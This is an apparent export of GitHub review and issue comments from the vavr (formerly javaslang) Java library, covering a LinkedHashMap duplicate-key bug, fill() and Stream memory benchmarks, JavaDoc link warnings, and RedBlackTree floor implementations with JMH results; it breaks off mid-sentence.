toTree(Function, Function) for simplify converting Value to tree with idMapper and parentMapper.\nThis changes made in separate commit for simplify review, if all is good to you I will combine than together for beautiful change history. JDK9 build is return strange error:\n\nerror: error while loading package, Missing dependency 'object java.lang.Object in compiler mirror', required by /home/travis/.m2/repository/org/scala-lang/scala-library/2.10.5/scala-library-2.10.5.jar(scala/runtime/package.class)\nerror: scala.reflect.internal.MissingRequirementError: object java.lang.Object in compiler mirror not found.. JDK8 build I will fix soon. @danieldietrich build for JDK8 fixed, please review changes. @danieldietrich completed.\nBut Java9 still fail to compile MatchTest#shouldDecomposeListWithNonEmptyTail. May be this behavior is version depended? Failed with Java HotSpot(TM) 64-Bit Server VM (build 9+181, mixed mode). @nfekete but GWT-part of vavr moved into separate project: https://github.com/vavr-io/vavr-gwt\nDoes the changes in source of vavr affect the assembly of vavr-gwt?. @danieldietrich, if @nfekete is right than please reject PR and maybe close issue #2075 .\n@nfekete please pay attention to issue #2075 and make same comments there. @talios please comment this issue rather than that PR. Maybe use name drop?. JDK9 build failed with Missing dependency 'object java.lang.Object in compiler mirror', required by /home/travis/.m2/repository/org/scala-lang/scala-library/2.10.5/scala-library-2.10.5.jar(scala/package.class). @ruslansennov fixed.\nMaybe move to milestone vavr-0.9.2?. @ruslansennov maybe move to milestone vavr-0.9.2?. Can somebody (@danieldietrich, @ruslansennov, @paplorinc , ...) hint me for the path to check the Future methods?\nFor Lazy and Lambda.Memoized it was easy: they must call to source method only once within all threads.\n\nBut for Future methods is not so easy:\n Future#find - Take list of Futures and find first completed Future which matches the predicate\n Future#await - Blocks the current Thread until this Future completed or returns immediately if this Future is already completed.\n Future#cancel - Cancels the Future. A running thread is interrupted.\n Future#onComplete - Performs the action once the Future is complete.\n Future#isEmpty - Checks, if this future has a value.\n Future#run - Starts an asynchronous computation\n. @ruslansennov fixed. @PascalSchumacher I don't see yours tiket than start to implement this :)\nI start thinking about this method after implementing #2156 - sometimes build negate version of predicate is too complex than simply call method that will negate my predicate internally.\nAnd currently vavr has methods that check elements that all or some match with predicate, and I think variant none match will cover all needs.. But what with Supplier variant?\nI think in some cases (int, Supplier) can be useful.\nOf course we can use Stream.continually(Supplier).take(int).toSortedSet(Comparator). Can be methods fill(int, T) and fill(int, Supplier<T>) ambiguous?\nMay be use different names like fill() + fillWith()?. Failed on JDK9 with FutureTest.shouldNotCrashWhenRecoverFails:852 Condition not met.\nMaybe tests run too slow?. @jlorenzen you need add generated files into commit too. Sorry, this my fall :(\nMay be add some comment for this line?. This problem exists not only on ofEntries but also in\nBug example on current snapshot code:\n```java\n    private static java.util.Map.Entry entry(int key, String value) {\n        return new java.util.AbstractMap.SimpleEntry<>(key, value);\n    }\nprivate static void info(LinkedHashMap<Integer, String> map) {\n    System.out.println(\"map = \" + map);\n    System.out.println(\"map.size() = \" + map.size());\n    System.out.println(\"map.keySet() = \" + map.keySet());\n    System.out.println(\"map.values() = \" + map.values().toList());\n    System.out.println();\n}\n\n@SuppressWarnings(\"unchecked\")\npublic static void main(String[] args) {\n    System.out.println(\"#Correct\");\n    info(LinkedHashMap.<Integer, String>empty()\n            .put(1, \"1\").put(1, \"2\")\n            .put(2, \"3\").put(2, \"4\")\n    );\n\n    System.out.println(\"#ofEntries(Tuple2<K, V>...)\");\n    info(LinkedHashMap.ofEntries(\n            Tuple.of(1, \"1\"), Tuple.of(1, \"2\"),\n            Tuple.of(2, \"3\"), Tuple.of(2, \"4\")\n    ));\n\n    System.out.println(\"#ofEntries(Entry...)\");\n    info(LinkedHashMap.ofEntries(\n            entry(1, \"1\"), entry(1, \"2\"),\n            entry(2, \"3\"), entry(2, \"4\")\n    ));\n\n    System.out.println(\"#ofEntries(Iterable<Tuple2<K, V>>)\");\n    info(LinkedHashMap.ofEntries(List.of(\n            Tuple.of(1, \"1\"), Tuple.of(1, \"2\"),\n            Tuple.of(2, \"3\"), Tuple.of(2, \"4\")\n    )));\n\n    System.out.println(\"#of(KVKV...)\");\n    info(LinkedHashMap.of(\n            1, \"1\", 1, \"2\",\n            2, \"3\", 2, \"4\"\n    ));\n\n    System.out.println(\"#tabulate(int, Function<Integer, Tuple2<K, V>>)\");\n    info(LinkedHashMap.tabulate(4, i ->\n        Tuple.of(Math.max(1, Math.min(i, 2)), String.valueOf(i + 1))\n    ));\n\n    System.out.println(\"#ofAll(Stream<T>, Function<T, Tuple2<K, V>>)\");\n    info(LinkedHashMap.ofAll(Stream.range(0, 4).toJavaStream(), i ->\n            Tuple.of(Math.max(1, Math.min(i, 2)), String.valueOf(i + 1))\n    ));\n\n    System.out.println(\"#ofAll(Stream<T>, Function<T, K>, Function<T, V>)\");\n    info(LinkedHashMap.ofAll(Stream.<Integer>range(0, 4).toJavaStream()\n            , i -> Math.max(1, Math.min(i, 2))\n            , i -> String.valueOf(i + 1)\n    ));\n\n    System.out.println(\"#fill(int, Supplier<Tuple2<K, V>>)\");\n    AtomicInteger i = new AtomicInteger();\n    info(LinkedHashMap.fill(4, () ->\n            Tuple.of(Math.max(1, Math.min(i.get(), 2)), String.valueOf(i.getAndIncrement() + 1))\n    ));\n}\n\nWill out:bash\nCorrect\nmap = LinkedHashMap((1, 2), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 2)\nmap.values() = List(2, 4)\nofEntries(Tuple2...)\nmap = LinkedHashMap((1, 1), (1, 2), (2, 3), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 1, 2, 2)\nmap.values() = List(1, 2, 3, 4)\nofEntries(Entry...)\nmap = LinkedHashMap((1, 1), (1, 2), (2, 3), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 1, 2, 2)\nmap.values() = List(1, 2, 3, 4)\nofEntries(Iterable>)\nmap = LinkedHashMap((1, 1), (1, 2), (2, 3), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 1, 2, 2)\nmap.values() = List(1, 2, 3, 4)\nof(KVKV...)\nmap = LinkedHashMap((1, 1), (1, 2), (2, 3), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 1, 2, 2)\nmap.values() = List(1, 2, 3, 4)\ntabulate(int, Function>)\nmap = LinkedHashMap((1, 1), (1, 2), (2, 3), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 1, 2, 2)\nmap.values() = List(1, 2, 3, 4)\nofAll(Stream, Function>)\nmap = LinkedHashMap((1, 2), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 2)\nmap.values() = List(2, 4)\nofAll(Stream, Function, Function)\nmap = LinkedHashMap((1, 2), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 2)\nmap.values() = List(2, 4)\nfill(int, Supplier>)\nmap = LinkedHashMap((1, 1), (1, 2), (2, 3), (2, 4))\nmap.size() = 2\nmap.keySet() = LinkedHashSet(1, 1, 2, 2)\nmap.values() = List(1, 2, 3, 4)\n```\nWill fix soon. @danieldietrich you can check this PR. > Sometimes the Supplier variant seems to be faster, sometimes it seems to be slower.\nThat's what embarrasses me.\nI see some cases that supplier-based variant is faster then object-based:\n```\nBenchmark                                              (CONTAINER_SIZE)   Mode  Cnt        Score   Error  Units\nArrayBenchmark.Fill.vavr_persistent_constant_object                1000  thrpt        187667,015          ops/s\nArrayBenchmark.Fill.vavr_persistent_constant_supplier              1000  thrpt        398973,534          ops/s\n\nSupplier is 1.6x faster than Object\n\nBenchmark                                               (CONTAINER_SIZE)   Mode  Cnt        Score   Error  Units\nVectorBenchmark.Fill.vavr_persistent_constant_object                1026  thrpt        257781,980          ops/s\nVectorBenchmark.Fill.vavr_persistent_constant_supplier              1026  thrpt        478027,314          ops/s\n\nSupplier is 1.85x faster than Object\n```\n\nBoth variant make almost the same thing, but supplier-base variant must call the supplier - I think because of this supplier-based variant must be always slower.\nAnd one more thing: for short sizes Scala's List is faster than Vavr's:\nBenchmark                                             (CONTAINER_SIZE)   Mode  Cnt        Score   Error  Units\nListBenchmark.Fill.scala_persistent                                100  thrpt       1234225,597          ops/s\nListBenchmark.Fill.vavr_persistent_constant_object                 100  thrpt       1021355,473          ops/s\nListBenchmark.Fill.vavr_persistent_constant_supplier               100  thrpt       1298274,304          ops/s\nPerhaps the reason is that I ran a short benchmark tests.\nI can try run full benchmark tests today night ~, but the evening will come at me only in about 10 hours~.. I run full benchmark at night:\n```\nPerformance Ratios\n=============================================================================================================================================================================\n  (Outliers removed: 30,00% low end, 5,00% high end)\nTarget                    Operation                                                                             Ratio                 10      100     1000     1026     2500\nArrayBenchmark            Fill                      vavr_persistent_constant_object/vavr_persistent_constant_supplier              1,18?    1,65?    3,01?             2,88?\nArrayBenchmark            Fill                      vavr_persistent_constant_supplier/vavr_persistent_constant_object              0,85?    0,61?    0,33?             0,35?\nListBenchmark             Fill                                       scala_persistent/vavr_persistent_constant_object              0,81?    0,66?    0,64?             0,65?\nListBenchmark             Fill                                     scala_persistent/vavr_persistent_constant_supplier              0,92?    0,72?    0,77?             0,71?\nListBenchmark             Fill                      vavr_persistent_constant_object/vavr_persistent_constant_supplier              1,14?    1,08?    1,19?             1,10?\nListBenchmark             Fill                      vavr_persistent_constant_supplier/vavr_persistent_constant_object              0,88?    0,93?    0,84?             0,91?\nListBenchmark             Fill                    vavr_persistent_constant_object/scala_persistent                                 1,24?    1,51?    1,55?             1,55?\nListBenchmark             Fill                    vavr_persistent_constant_supplier/scala_persistent                               1,09?    1,40?    1,30?             1,40?\nPriorityQueueBenchmark    Fill                      vavr_persistent_constant_object/vavr_persistent_constant_supplier              1,07?    1,03?    2,15?             0,99?\nPriorityQueueBenchmark    Fill                      vavr_persistent_constant_supplier/vavr_persistent_constant_object              0,94?    0,97?    0,47?             1,01?\nVectorBenchmark           Fill                                       scala_persistent/vavr_persistent_constant_object              0,60?    0,39?    0,79?    0,31?    0,78?\nVectorBenchmark           Fill                                     scala_persistent/vavr_persistent_constant_supplier              0,91?    0,60?    0,95?    0,44?    1,76?\nVectorBenchmark           Fill                      vavr_persistent_constant_object/vavr_persistent_constant_supplier              1,50?    1,54?    1,21?    1,43?    2,25?\nVectorBenchmark           Fill                      vavr_persistent_constant_supplier/vavr_persistent_constant_object              0,67?    0,65?    0,83?    0,70?    0,44?\nVectorBenchmark           Fill                    vavr_persistent_constant_object/scala_persistent                                 1,65?    2,56?    1,27?    3,22?    1,28?\nVectorBenchmark           Fill                    vavr_persistent_constant_supplier/scala_persistent                               1,10?    1,66?    1,05?    2,26?    0,57?\n```\nI can describe this results as:\n Scala is slower than vavr (both variant)\n fill(int, T) is faster than fill(int, Supplier<T>). @danieldietrich thanks for review!\nFixed. > Suppose there is a large map that maps some keys to streams of data. There is a function that accepts the map and filter it's values in a lazy manner (since the values are Streams). Since Steams are eager to the head, the filtering will be eager until first element that satisfies the predicate will be found.\nHow do you plan to filter the map by value without calculating the values?\nCan you give some demo code?. java.nio.file.Files.lines(java.nio.file.Path) return java.util.stream.Stream<String> which process lines in lazy matter: one-by-one, forget-about-old\nBut Vavr's Stream is lazy stream with memory: it get items from source stream one-by-one, but it remember all values.\nIf you don't need old values you can use Vavr's Iterator:\n```java\nOption\n        .of(PATH_TO_A_HUGE_TEXT_FILE)\n        .map(Paths::get)\n        .toTry()\n        .mapTry(Files::lines)\n        .map(BaseStream::iterator)\n        .map(Iterator::ofAll)\n        .map(lines -> lines.map(String::toUpperCase))\n        .forEach(transformed -> transformed.forEach(line -> {\n    }));\n\n```\nP.S.\nI don't run this code on large file yet.. I write short test code for compare performance of Java Stream, Vavr Stream and Vavr iterator.\n```java\n    enum Sizes {\n        Bytes(1),\n        KiB(1024),\n        MiB(1024 * 1024),\n        GiB(1024 * 1024 * 1024),\n        ;\n    private final long value;\n\n\n    Sizes(long value) {\n        this.value = value;\n    }\n\n    public static String toString(long value) {\n        Sizes size = Bytes;\n        for (Sizes s : Sizes.values()) {\n            if (s.value <= value) {\n                size = s;\n            }\n        }\n\n        return String.format(Locale.US, \"%.2f %s\", (double) value / size.value, size.name());\n    }\n\n    public static void printMemoryInfo() {\n        Runtime runtime = Runtime.getRuntime();\n        System.out.println(String.format(\n                \"Memory[Total: %s; Free: %s; Max: %s; Used: %s]\"\n                , toString(runtime.totalMemory())\n                , toString(runtime.freeMemory())\n                , toString(runtime.maxMemory())\n                , toString(runtime.totalMemory() - runtime.freeMemory())\n        ));\n    }\n}\n\nprivate Try<java.util.stream.Stream<String>> readLineOfHugeTextFile(int maxLineLength, long streamSize) {\n    String source = \"qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM\";\n    int len = source.length();\n    Random random = new Random();\n    Stream<String> stream = Stream\n            .generate(() -> {\n                char[] chars = new char[random.nextInt(maxLineLength)];\n                for (int i = 0; i < chars.length; i++) {\n                    chars[i] = source.charAt(random.nextInt(len));\n                }\n                return new String(chars);\n            })\n            .limit(streamSize);\n    return Try.of(() -> stream);\n}\n\n@Test\npublic void testJavaStream() {\n    Sizes.printMemoryInfo();\n    AtomicLong counter = new AtomicLong();\n    long used = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory();\n    readLineOfHugeTextFile(1_000, 1_000_000)\n            .map(lines -> lines.map(String::toUpperCase))\n            .forEach(transformed -> transformed.forEach(line -> {\n                counter.addAndGet(line.length());\n            }));\n    Runtime.getRuntime().freeMemory();\n    Sizes.printMemoryInfo();\n    System.out.println(\"Total chars: \" + counter);\n    System.out.println(\"Used: \" + Sizes.toString(Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory() - used));\n}\n\n@Test\npublic void testVavrStream() {\n    Sizes.printMemoryInfo();\n    AtomicLong counter = new AtomicLong();\n    long used = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory();\n    readLineOfHugeTextFile(1_000, 1_000_000)\n            .map(io.vavr.collection.Stream::ofAll)\n            .map(lines -> lines.map(String::toUpperCase))\n            .forEach(transformed -> transformed.forEach(line -> {\n                counter.addAndGet(line.length());\n            }));\n    Runtime.getRuntime().freeMemory();\n    Sizes.printMemoryInfo();\n    System.out.println(\"Total chars: \" + counter);\n    System.out.println(\"Used: \" + Sizes.toString(Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory() - used));\n}\n\n@Test\npublic void testVavrIterator() {\n    Sizes.printMemoryInfo();\n    AtomicLong counter = new AtomicLong();\n    long used = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory();\n    readLineOfHugeTextFile(1_000, 1_000_000)\n            .map(BaseStream::iterator)\n            .map(io.vavr.collection.Iterator::ofAll)\n            .map(lines -> lines.map(String::toUpperCase))\n            .forEach(transformed -> transformed.forEach(line -> {\n                counter.addAndGet(line.length());\n            }));\n    Runtime.getRuntime().freeMemory();\n    Sizes.printMemoryInfo();\n    System.out.println(\"Total chars: \" + counter);\n    System.out.println(\"Used: \" + Sizes.toString(Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory() - used));\n}\n\n```\ntestJavaStream\nMemory[Total: 243.50 MiB; Free: 226.85 MiB; Max: 3.51 GiB; Used: 16.65 MiB]\nMemory[Total: 486.50 MiB; Free: 271.04 MiB; Max: 3.51 GiB; Used: 215.46 MiB]\nTotal chars: 499 352 382\nUsed: 198.82 MiB\ntestVavrStream\nMemory[Total: 243.50 MiB; Free: 226.86 MiB; Max: 3.51 GiB; Used: 16.64 MiB]\nMemory[Total: 2.37 GiB; Free: 1.04 GiB; Max: 3.51 GiB; Used: 1.33 GiB]\nTotal chars: 499 218 992\nUsed: 1.31 GiB\ntestVavrIterator\nMemory[Total: 243.50 MiB; Free: 226.77 MiB; Max: 3.51 GiB; Used: 16.73 MiB]\nMemory[Total: 577.00 MiB; Free: 477.37 MiB; Max: 3.51 GiB; Used: 99.63 MiB]\nTotal chars: 499 010 003\nUsed: 82.90 MiB\nThis is not full and correct benchmark after all.. @ruslansennov fixed, thanks!. I don't meet the ClassCastException before.\nCan you show reproducible code example with ClassCastException?. Table with compare exists java.util.Optional methods with io.vavr.control.Option (with simplified generics):\njava.util.Optional | Behavior | io.vavr.control.Option\n------------ | ------------- | -------------\nT get() | Return wrapped value or throw NoSuchElementException | T get()\nboolean isPresent() | Return true if not empty and false otherwise | boolean isDefined()\nvoid ifPresent( Consumer<T> ) | Call to consumer if not empty | Option<T> peek( Consumer<T> )\nOptional<T> filter( Predicate<T> ) | Return non empty wrapper if value matches the predictae and empty otherwise | Option<T> filter( Predicate<T> )\nOptional<U> map( Function<T, U> ) | Convert exists value to other with given mapper or empty if already empty | Option<U> map( Function<T, U> )\nOptional<U> flatMap( Function<T, Optional<U>> ) | Convert exists value to other with given mapper or empty if already empty | Option<U> flatMap( Function<T, Option<U>> )\nT orElse(T other) | Return wrapped value or given value | T getOrElse(T other)\nT orElseGet( Supplier<T> ) | Return wrapped value or value from given supplier | T getOrElse( Supplier<T> )\nT orElseThrow( Supplier<Throwable> ) | Return wrapped value or throw exception from given supplier | T getOrElseThrow( Supplier<Throwable> )\nWhat function from java.util.Optional you can not find in io.vavr.control.Option?\nAs I see all methods exists in java.util.Optional has direct or better alternatives in io.vavr.control.Option.. @danieldietrich, all listed classes (Try, Option, Either, Validation, Future) are extend io.vavr.Value which already has method getOrElseThrow(Supplier<X extends Throwable> supplier).\nWe really need same method with different name?. I am adding it now\n. I don't known how to remove this hack.\nIf I describe K2 in TreeMap as K2 extends Comparable<? super K2> then I must describe it with same limit in SortedMap (it's ok) and Map (this is not ok).\n. @ruslansennov I can remove comment and all will be OK?\n. @ruslansennov todo removed\n. My bad, sorry\n. @danieldietrich I implement such check for javaslang.ValueModule#toTraversable because this method convert Value<T> into Traversable<T>, and in case Set<T>#toSet() we can use same object.\nBut I think this is not needed for javaslang.ValueModule#toMap, because we alway have mapping function and in case of converting HashMap<K, V> to map we can not return same object because we must consider to mapping function. And only in case than mapping function for new Map return same Tuple we can return original Map. But how to detect this?\n. Right, but it's not my decision - I am only follow current code style: \n- https://github.com/javaslang/javaslang/blob/master/javaslang/src-gen/main/java/javaslang/API.java#L87\n- https://github.com/javaslang/javaslang/blob/master/javaslang/src-gen/main/java/javaslang/API.java#L109\n- https://github.com/javaslang/javaslang/blob/master/javaslang/src-gen/main/java/javaslang/API.java#L598\n. R is not return type of this function, but it return type in the lambda. I am use same text as in JavaDoc of javaslang.Function1#of.\nAll types in this JavaDoc are refers to the argument types\nI will be glad if you offer a good option\n. If this can add more significance to test - yes I can, but how function1 can return something other than Function1?\n. API, as described before, can be used as single static import import static javaslang.API.* - and you receive access to almost functions from Javaslang, without needed to import something else\n. This is not best implementation, I am really want only uncapitalize, but currently simple toLowerCase work to, but not in all cases.\nI will add function uncapitalize today\n. Need I create more specific test for both variant with check of result classes?\n. @danieldietrich what aliases we need for access for LinkedHashSet, HashSet, LinkedHashMap, HashMap?\n1. linkedHashSet, hashSet, linkedHashMap, hashMap\n2. linkedSet, set, linkedMap, map\n. Most test for aliases is only for get 100% test coverage\n. Fixed\n. Fixed\n. Fixed\n. And in this case I am testing alias which expect Java's Stream as input, not Java's Stream itself\n. I found exists functions firstLower/firstUpper\n. Almost all current tests created only for test what alias return something, and only few tests check that alias return exactly that he need to return (Future, Try).\n. I think - yes we need aliases and for this classes to: user can add one import and obtain access to most useful functions\n. Yes it can, but if there is a profit?\n. Yes I remember discussion. But in that time we decide to include this method.\nWill be removed\n. Yes\n. Yes\n. {@code Something} is not generate link. Links generate {@link ClassName}\n. After create alias for empty collections I create tests for this aliases\n. I will edit all commits - and it will be relatively simple\n. In form {@link HashMap#of(K, V)} JavaDoc show error. I trying this for in start on implementation, but forced to use form {@link HashMap#of(Object, Object)}\n. @danieldietrich say: I think isNotNull is the best we can do here.\n. Good, will try\n. IDEA accept, but DocLint not, as I remember. Recheck later\n. {@code Something} in JavaDoc will generate text with style code - only text without any link.\nIn IDEA no links too.\nNow I set {@link ClassName} in all return JavaDoc parts\n. Yes, I remember correctly: IDEA accept JavaDoc link as {@link HashMap#of(K, V)}, but javadoc linter in stage javadoc:javadoc generate warnings warning - Tag @link: can't find of(K, V) in javaslang.collection.HashMap for all links to methods with generic classes in arguments.\n. this map is unchanged anyway. Wouldn't the use of this reserved word be misleading?\n. Javadoc linter in stage javadoc:javadoc will be generate warnings in link to HashMap#of(K, V, K, V). I think JavaDoc linter does not known about generics.\nLink HashMap#of(Object, Object, Object, Object) will be correctly parsed by JavaDoc linter and Java IDE.\n. Warning from JavaDoc linter as above\n. In average you use Tuple2::_2 for mapping function\n. dito\n. Maybe start message with upper case char? As in java.text.DateFormatSymbols#getInstance(Locale)\n. JavaDoc lint does not known about generics, and will generate Warning for {@link HashMap#of(K, V, K, V)}.\n. @PascalSchumacher, yes. Sorry - will fix now. @ruslansennov fixed. Was it necessary to change the formatting of the code?\nFormatting changes a hide the real changes and not necessary as I think.. Why you remove this tests?. All current test is used in form assertThat(actual).testMethod(expected); and more - assertThat(actual) is support chaining: assertThat(t.remove(4)).isEqualTo(t).isNotSameAs(t);. removeAll(Predicate) is deprecated now - you must use reject(Predicate) or add annotation @SuppressWarnings(\"deprecation\") to the test method. @NataliiaPrivezentseva, I think that you should not change formatting of lines that you don't really change.. This test must use exactly removeAll method. It is deprecated, but must be tested too. removeAll. removeAll. If you test call to method reject you test method should include word reject but it include remove. Do we need this check here?. Do we need this check here?. We don't need to check simple values for null - this is user side.. But we must check tuple for null because we will go deeper with them. @danieldietrich need add JavaDoc for generics?\nSomething like * @param <T${i+1}> type of the value to add\nAnd same for concat. @jlorenzen JDK itself use JavaDoc for generic attibutes.\nYou can find this at java.util.stream.Stream#map: JavaDoc / Source. ",
    "eduardmanas": "That's great, let me give it a try.  I'll create a NavigableMap interface similar to the java.util.\nThe reason why I suggested to drop \"Entry\" from the method names is to keep it consistent with the current naming in the javaslang collection. A lot of methods return Tuple2 (equivalent of Map.Entry) and we do not name them \"Entry\". Examples are get(), head(), last(), min(), max(). In the java.util.Map hierarchy, these methods would return the value and not the Map.Entry.\nI get your point we need to maximise recognition with the original Java 8 method names. But also we need to balance this with building a cohesive library with consistent names.\nSo what do you think, \"Entry\" or no \"Entry\"? ;)\n. Also, I noticed an inconsistency with the head()/tail() method names. head() returns the first item of the map, but tail() returns a TreeMap without the first element.\nAlso, last() returns the last item in the Map, but there is no natural counterpart called first() (it is currently called head())\nWhat if we deprecate both head() and tail() for inconsistent, and we add the following methods to the new NavigableMap interface:\n* TreeMap<K, V> headMap() // returns the head of the tree without the last item - equivalent of headMap(last(), false)\n* TreeMap<K, V> tailMap() // returns the tail of the tree without the first item - equivalent of tailMap(first(), false)\n* first() // Returns the first item - equivalent of min().getOrElseThrow()\nUpdate:\nOn a closer look, it seems the inconsistency comes from the Traversable interface, where we use head() to get the first item and last() to get the last item. Is there any reason why we used head() instead of first()?  \nSimilarly, it would feel more natural if head() had been the natural counterpart of the existing tail() returning Traversable<T>.\n. You are right. The current javaslang implementation is a port of the Traversable Scala trait. I think we should keep it as it is. It will confuse some Java programmers at the beginning (like me!), but at least it is consistent with the Scala port.\nIt anything, we might want to consider adding first()/firstOption() to Traversable as an alternative to head()/headOption(). It would feel more natural to people coming from a Java background.\n. I have two implementations to calculate the floor in RedBlackTree: \n- Option 1: \"uglier\" imperative approach and faster (but not too ugly)\n- Option 2: \"nicer\" functional approach and slower (but not too slow)\nI have tested with trees of 100, 1000, 10000 and 100000 items, and Option 1 is consistently 10-15% faster. Having said that, both options have complexity O(log N), so they are both relatively fast.\nAny preferences?\nOption 1\n@Override\n        public Option<T> floor(T value) {\n            Option<T> candidate = Option.none();\n            RedBlackTree<T> current = this;\n            while (!current.isEmpty()) {\n                final Node<T> node = (Node<T>) current;\n                final int result = empty.comparator.compare(value, node.value);\n                if (result == 0) {\n                    return Option.of(value);\n                }\n                if (result < 0) {\n                    current = node.left;\n                }\n                else {\n                    candidate = Option.of(node.value);\n                    current = node.right;\n                }\n            }\n            return candidate;\n        }\nOption 2\n```\n        @Override\n        public Option floor(T value) {\n            return floor(value, Option.none());\n        }\n    @Override\n    public Option<T> floor(T value, Option<T> candidate) {\n        final int result = empty.comparator.compare(value, this.value);\n        if (result == 0) {\n            return Option.of(value);\n        }\n        if (result < 0) {\n            return left.floor(value, candidate);\n        }\n        return right.floor(value, Option.of(this.value));\n    }\n\n``\n. I compared thefloormethod performance againstjava.util.TreeMap.TreeMap` is about 20% faster than Option1, and about 30% faster than Option2. \nI created another version that uses nulls instead of Option inside of the loop (Option 0). That option is 10% faster than Option 1, and just 10% slower than java.util.TreeMap.\nThe java.util.TreeMap implementation is similar to Option0/Option1. These are the main differences:\n- TreeMapdoes not make use of empty nodes\n- TreeMapcan access the parent node\nI think most of that 10% performance is due to the extra processing of empty nodes in our RedBlackTrees.\nI am going to proceed to implement the remaining methods using the Option 0 approach.\nOption 0\n@Override\n        public Option<T> floor(T value) {\n            T candidate = null;\n            RedBlackTree<T> current = this;\n            while (!current.isEmpty()) {\n                final Node<T> node = (Node<T>) current;\n                final int result = empty.comparator.compare(value, node.value);\n                if (result < 0) {\n                    current = node.left;\n                }\n                else if (result > 0) {\n                    candidate = node.value;\n                    current = node.right;\n                }\n                else {\n                    return Option.of(value);\n                }\n            }\n            return candidate == null ? Option.none() : Option.of(candidate);\n        }\nI just noticed you are using JMH for Benchmarking, so here the results: \n```\nBenchmark                            (containerSize)   Mode  Cnt    Score    Error   Units\nTreeMapBenchmark.floor                            10  thrpt   10  104.216 \u00b1 17.007  ops/us\nTreeMapBenchmark.floor:floorJava                  10  thrpt   10   28.811 \u00b1  6.408  ops/us\nTreeMapBenchmark.floor:floorOption0               10  thrpt   10   27.011 \u00b1  5.214  ops/us\nTreeMapBenchmark.floor:floorOption1               10  thrpt   10   24.929 \u00b1  3.590  ops/us\nTreeMapBenchmark.floor:floorOption2               10  thrpt   10   23.466 \u00b1  3.486  ops/us\nTreeMapBenchmark.floor                           100  thrpt   10   64.840 \u00b1  2.076  ops/us\nTreeMapBenchmark.floor:floorJava                 100  thrpt   10   19.670 \u00b1  0.820  ops/us\nTreeMapBenchmark.floor:floorOption0              100  thrpt   10   16.900 \u00b1  0.187  ops/us\nTreeMapBenchmark.floor:floorOption1              100  thrpt   10   15.502 \u00b1  1.287  ops/us\nTreeMapBenchmark.floor:floorOption2              100  thrpt   10   12.769 \u00b1  0.167  ops/us\nTreeMapBenchmark.floor                          1000  thrpt   10   45.472 \u00b1  1.646  ops/us\nTreeMapBenchmark.floor:floorJava                1000  thrpt   10   13.127 \u00b1  0.475  ops/us\nTreeMapBenchmark.floor:floorOption0             1000  thrpt   10   11.847 \u00b1  0.387  ops/us\nTreeMapBenchmark.floor:floorOption1             1000  thrpt   10   11.131 \u00b1  0.434  ops/us\nTreeMapBenchmark.floor:floorOption2             1000  thrpt   10    9.367 \u00b1  0.410  ops/us\nTreeMapBenchmark.floor                         10000  thrpt   10   29.929 \u00b1  0.567  ops/us\nTreeMapBenchmark.floor:floorJava               10000  thrpt   10    8.421 \u00b1  0.154  ops/us\nTreeMapBenchmark.floor:floorOption0            10000  thrpt   10    7.766 \u00b1  0.375  ops/us\nTreeMapBenchmark.floor:floorOption1            10000  thrpt   10    7.116 \u00b1  0.208  ops/us\nTreeMapBenchmark.floor:floorOption2            10000  thrpt   10    6.627 \u00b1  0.089  ops/us\n``\n. @danieldietrich, I was also thinking whether there is any point having aNavigableMap` interface. \nNot sure why anybody would want to have a non-navigable SortedMap, as the whole point of having the map sorted is that you can navigate it. For starters there is a lot of overlap between the java.util.SortedMap and java.util.NavigableMap.  SortedMap, for example, has many navigational methods such as firstKey/headMap/lastKey/subMap/tailMap that also belong to the NavigableMap interface.  \nThis conceptual inconsistency is also clearly shown in the JDK implementation. All JDK implementation of SortedMap also implement NavigableMap, and vice-versa. Given NavigableMap extends SortedMap, if this was a clean split of functionality, implementations should just implement NavigableMap and not SortedMap\nLast but not least, the Scala collections hierarchy does not have a NavigableMap interface. \nSo +1 to place the new methods in the javaslang SortedMap interface.\n. I agree with using theelse if` (already implemented in Option 0) ;)\nAs per <, ==, >, I am not so sure.  I prefer <, >, ==, and here is why. \nUnderstanding how to navigate Red-Black trees is complex stuff. Anybody looking at this code will probably have to bang his/her head against a table for a while until everything starts to make sense anyway. \nWhen looking at the condition inside of the while, you are conceptually in a node and you are presented with three options depending whether the value is same, lower or higher than the value of the node.\nThe option that everybody will tackle first is the simplest case when values are the same. This case is straight forward. You found the node you were looking for, just return it.  At this point, people will probably want to go for a break faced with the daunting thought of having to tackle the other two scenarios. If the Comparator returns -1, does that mean the value is lower or higher than the node? If the value is lower, do I go left or right? Do I keep track of the candidate? Have I found my value?\nIn other words, the < and > cases are similar in terms of complexity and reasoning, and therefore it makes sense to have them one after the other. The == case is much easier to understand and completely different in terms of reasoning. If we put == in the middle, we would be breaking this flow.\n. Quick Question: \nShould min()/max() use the natural comparator or the tree comparator?\nThe javadoc in Traversable states min()/max() should use the natural comparator, so using the (expected) tree comparator would be breaking that contract. This seems wrong/counter-intuitive for any sorted collection. \nhead()/last(), on the other hand, use the tree comparator.\nThis is especially troublesome with descending maps. For example, if we have this tree\nTreeMap<Integer, Integer> tree = TreeMap.of(Tuple.of(1, 1), Tuple.of(2, 2), Tuple.of(3, 3));\nThen we get the below as expected:\ntree.min()  // Option.of(Tuple.of(1, 1))\ntree.max()  // Option.of(Tuple.of(3, 3))\ntree.head()  // Tuple.of(1, 1)\ntree.last()  // Tuple.of(3, 3)\nHowever, when we change the comparator then we get weird things happening with min()/max():\ntree.descendingMap().min()  // Option.of(Tuple.of(1, 1))\ntree.descendingMap().max()  // Option.of(Tuple.of(3, 3))\ntree.descendingMap().head()  // Tuple.of(3, 3) \ntree.descendingMap().last()  // Tuple.of(1, 